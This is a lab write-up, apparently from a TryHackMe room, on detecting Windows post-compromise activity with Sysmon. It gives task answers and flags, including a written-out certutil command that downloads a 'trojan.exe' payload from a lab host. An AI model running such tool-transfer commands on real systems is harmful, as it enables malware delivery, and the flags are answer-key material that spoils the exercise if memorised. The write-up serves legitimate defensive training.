## Summary

In this room, I practiced detecting post-compromise activities on Windows endpoints, covering Discovery, Collection, Exfiltration, and Ingress Tool Transfer. First, I executed basic enumeration commands like `net user Administrator` and observed how Sysmon logs process creation (`Event ID 1`). Next, I analyzed the Sysmon logs generated by `invoice.pdf.exe` to trace its automated discovery commands (`whoami`, checking for Microsoft Defender for Endpoint via `MsSense.exe`) and its C2 DNS exfiltration query (`Event ID 22`). After manually inspecting high-value targets on the host (saved browser credentials, SSH keys, and internal network diagrams), I investigated `stealer.exe` in Sysmon to identify its temporary staging folder, targeted document extensions (`xlsx`, `pdf`, `docx`), clipboard harvesting via `Get-Clipboard`, and exfiltration to an S3 bucket. Finally, I tested four common Ingress Tool Transfer methods (browser, `curl.exe`, `certutil.exe`, and PowerShell `Invoke-WebRequest`) to see how each download utility leaves distinct command-line artifacts.

---

**Learning Objectives**

- Detect common Discovery techniques using Windows Event Logs
- Trace attack origins by reconstructing process trees
- Identify data targeted by threat actors and understand how they stage and exfiltrate it
- Analyze command logging by running malicious commands and observing how they are recorded in logs

## Task 1.1
Open CMD and type `net user Administrator`. Which privileged group does the user belong to?

**Answer**: `Administrators`

**Why?**
Running `net user Administrator` in Command Prompt displays the account details for the built-in Administrator user. At the bottom of the output, the **Local Group Memberships** field shows `*Administrators`.

![](../../assets/Pasted%20image%2020261109024420.png)

## Task 1.2
Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just ran?

**Answer**: `C:\Windows\System32\net.exe`

**Why?**
Looking at the Sysmon Operational log in Event Viewer and checking `Event ID 1` (`ProcessCreate`) for the `CommandLine: net user Administrator`, the **Image** field shows the full path to the binary that executed the command: `C:\Windows\System32\net.exe`.

![](../../assets/Pasted%20image%2020261109042401.png)

## Task 5.3
Download `http://appsforfree.thm/trojan.exe` using the certutil utility. What is the flag?

**Answer**: `THM{abusing_certutil}`

**Why?**
Running `certutil.exe -urlcache -f http://appsforfree.thm/trojan.exe` in Command Prompt downloads the payload and prints the hex/ASCII dump in the console, revealing the flag `THM{abusing_certutil}`.

![](../../assets/Pasted%20image%2020261109060416.png)
